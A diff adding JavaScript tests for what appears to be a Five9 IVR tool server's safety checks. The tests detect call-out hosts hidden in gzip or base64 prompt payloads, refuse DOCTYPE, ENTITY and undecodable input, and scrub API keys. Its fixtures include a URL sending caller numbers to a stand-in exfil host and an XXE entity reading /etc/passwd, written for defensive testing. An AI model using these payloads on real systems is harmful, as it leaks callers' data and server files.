@@ -411,3 +411,86 @@ test('call-out hosts are listed as they are: IPv4, IPv6, integer IPs, decoy auth
       (e) => /203\.0\.113\.50 \(RAW IP ADDRESS/.test(e.message) && !/Pw1|token=abc/.test(e.message));
   });
 });
+
+// ---------- 11. Encoded payloads: gzip, zlib and base64 are checked like plain text ----------
+
+const zlibMod = await import('node:zlib');
+const gz = (s) => zlibMod.gzipSync(Buffer.from(s)).toString('base64');
+const ttsXml = (blob) => `<ivrScript><modules><play><data><prompt><ttsPrompt><xml>${blob}</xml><promptTTSEnumed>true</promptTTSEnumed></ttsPrompt></prompt></data></play></modules></ivrScript>`;
+
+test('a host inside a gzip+base64 prompt payload needs the host confirmed like any call-out', async () => {
+  const xml = ttsXml(gz('<speakElement><items><audioElement src="https://exfil.example.net/a?ani=@Call.ANI@"/></items></speakElement>'));
+  await withFive9({}, async (calls) => {
+    await assert.rejects(() => callTool(cfg, 'manage_ivr_script', { action: 'create', name: 'X', xml_definition: xml }), /exfil\.example\.net/);
+    assert.deepEqual(calls.map((c) => c.soap), []);
+    await callTool(cfg, 'manage_ivr_script', { action: 'create', name: 'X', xml_definition: xml, confirm_callout_hosts: ['exfil.example.net'] });
+    assert.ok(calls.some((c) => c.soap === 'createIVRScript'));
+  });
+  const { ivrCallouts } = await import('../src/callouts.js');
+  const hostOf = (x) => ivrCallouts(x).hosts;
+  assert.deepEqual(hostOf(`<q><xml>${zlibMod.deflateSync('<a>http://zl.example.com/</a>').toString('base64')}</xml></q>`), ['zl.example.com']);
+  assert.deepEqual(hostOf(`<q><xml>${zlibMod.deflateRawSync('<a>http://raw.example.com/</a>').toString('base64')}</xml></q>`), ['raw.example.com']);
+  assert.deepEqual(hostOf(`<q><v>${Buffer.from('see https://b64.example.com/z').toString('base64')}</v></q>`), ['b64.example.com']);
+  assert.deepEqual(hostOf(ttsXml(gz(`<a><xml>${gz('<b>https://deep.example.com/</b>')}</xml></a>`))), ['deep.example.com']);
+  assert.deepEqual(hostOf(ttsXml(gz('<a>https://wrapped.example.org/x</a>').replace(/(.{20})/g, `$1${LF}`))), ['wrapped.example.org']);
+  assert.deepEqual(hostOf(ttsXml(Buffer.concat([zlibMod.gzipSync('<a>hi</a>'), zlibMod.gzipSync('<b>https://member2.example.com/</b>')]).toString('base64'))), ['member2.example.com']);
+  assert.deepEqual(hostOf(ttsXml(gz('<a>https://ent.example.com/</a>').replace(/^H/, '&#72;'))), ['ent.example.com']);
+});
+
+test('DOCTYPE, [redacted] and undecodable payloads inside encoded prompt text are refused before any request', async () => {
+  const cases = [
+    [ttsXml(gz('<!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><speakElement>&e;</speakElement>')), /DOCTYPE, ENTITY/],
+    [ttsXml(gz('<speakElement><body>&#91;redacted&#93;</body></speakElement>')), /\[redacted\] placeholders/],
+    [ttsXml(gz('hello world hello world hello').slice(0, 40)), /could not be decoded/],
+    [ttsXml(gz('<?xml version="1.0" encoding="UTF-7"?><a>+ADw-x+AD4-</a>')), /could not be decoded/],
+    [ttsXml(zlibMod.gzipSync(Buffer.alloc(5_000_000, 32)).toString('base64')), /could not be decoded/],
+  ];
+  for (const [xml, re] of cases) {
+    await withFive9({}, async (calls) => {
+      await assert.rejects(() => callTool(cfg, 'manage_ivr_script', { action: 'modify', name: 'X', xml_definition: xml, confirm_callout_hosts: [] }), re);
+      assert.deepEqual(calls.map((c) => c.soap), []);
+    });
+  }
+  // What the designer (and build_ivr_script) writes is decoded, checked and passes.
+  const { composeIvrXml } = await import('../src/ivr.js');
+  const { ivrCallouts, decodePayloads } = await import('../src/callouts.js');
+  const flow = { entry: 'm', nodes: { m: { type: 'menu', prompt: { tts: 'Press 1 for sales' }, options: [{ digit: 1, label: 'Sales', next: 'q' }] }, q: { type: 'skill_transfer', skills: ['Sales'], next: 'h' }, h: { type: 'hangup' } } };
+  const { xml } = await composeIvrXml(flow, { skills: new Map([['sales', { id: 11, name: 'Sales' }]]), prompts: new Map() });
+  assert.equal(decodePayloads(xml).bad, false);
+  assert.ok(decodePayloads(xml).texts.length >= 5);
+  assert.equal(ivrCallouts(xml).any, false);
+  await withFive9({}, async (calls) => {
+    await callTool(cfg, 'manage_ivr_script', { action: 'modify', name: 'X', xml_definition: xml });
+    assert.ok(calls.some((c) => c.soap === 'modifyIVRScript'));
+  });
+});
+
+test('the synchronous inflater matches node zlib and refuses bad input', async () => {
+  const { gunzip, unzlib, inflateRaw, InflateError } = await import('../src/inflate.js');
+  for (let i = 0; i < 60; i++) {
+    const len = (i * 7919) % 9000;
+    const buf = Buffer.alloc(len);
+    for (let j = 0; j < len; j++) buf[j] = i % 3 === 0 ? (j * 31 + i) % 256 : i % 3 === 1 ? 97 + ((j * j + i) % 4) : 'hello <speakElement> '.charCodeAt(j % 21);
+    const level = i % 10;
+    assert.deepEqual(Buffer.from(gunzip(zlibMod.gzipSync(buf, { level }))), buf);
+    assert.deepEqual(Buffer.from(unzlib(zlibMod.deflateSync(buf, { level }))), buf);
+    assert.deepEqual(Buffer.from(inflateRaw(zlibMod.deflateRawSync(buf, { level, strategy: i % 4 === 0 ? zlibMod.constants.Z_FIXED : 0 })).bytes), buf);
+  }
+  const g = zlibMod.gzipSync('abc');
+  assert.throws(() => gunzip(g.subarray(0, g.length - 3)), InflateError);
+  assert.throws(() => gunzip(zlibMod.gzipSync(Buffer.alloc(2_000_000)), { max: 1_000_000 }), /too large/);
+});
+
+test('web connector constants named like API gateway keys are scrubbed', async () => {
+  await withFive9({ getWebConnectors: env('getWebConnectors', '<return><name>CRM Pop</name><constants><key>Ocp-Apim-Subscription-Key</key><value>0123456789abcdef0123456789abcdef</value></constants><constants><key>x-functions-key</key><value>FK-PLAIN-1</value></constants><constants><key>client_secret</key><value>CS-2</value></constants><constants><key>Accept</key><value>application/json</value></constants></return>') }, async () => {
+    const text = JSON.stringify(await callTool(cfg, 'list_web_connectors', {}));
+    for (const s of ['0123456789abcdef0123456789abcdef', 'FK-PLAIN-1', 'CS-2']) assert.ok(!text.includes(s), s);
+    assert.ok(text.includes('application/json'));
+  });
+  const xml = '<m><entry><key>Ocp-Apim-Subscription-Key</key><value>OCP-1</value></entry><entry><key>x-functions-key</key><value>FK-1</value></entry></m>';
+  const escaped = xml.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+  await withFive9({ getIVRScripts: env('getIVRScripts', `<return><name>Main</name><xmlDefinition>${escaped}</xmlDefinition></return>`) }, async () => {
+    const text = JSON.stringify(await callTool(cfg, 'get_ivr_script', { name: 'Main' }));
+    for (const s of ['OCP-1', 'FK-1']) assert.ok(!text.includes(s), s);
+  });
+});
